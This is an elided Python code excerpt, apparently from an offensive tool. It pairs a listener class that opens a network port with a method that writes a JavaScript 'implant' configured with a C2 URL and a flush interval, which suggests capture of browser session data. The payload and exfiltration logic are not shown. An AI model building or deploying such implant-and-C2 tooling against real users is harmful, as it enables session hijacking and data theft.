...
class SessionMonitorListener:
    ...
    def start(self, on_event: Callable = None) -> bool:
        ...
        try:
            ...
            t.start()
            logger.info("session_monitor", f"Listener active on {self._host}:{self._port}")
            return True
        except Exception as e:
            logger.error("session_monitor", f"Listener start failed: {e}")
            return False
...
class SessionMonitor:
    ...
    def __init__(self):
        self.listener = SessionMonitorListener()
    ...
    def save_implant(self, output_path: str, c2_url: str, flush_ms: int = 3000) -> str:
        ...
        with open(output_path, "w") as f:
            f.write(js)
        logger.info("session_monitor", f"Implant saved: {output_path} ({len(js)}B)")
        return output_path
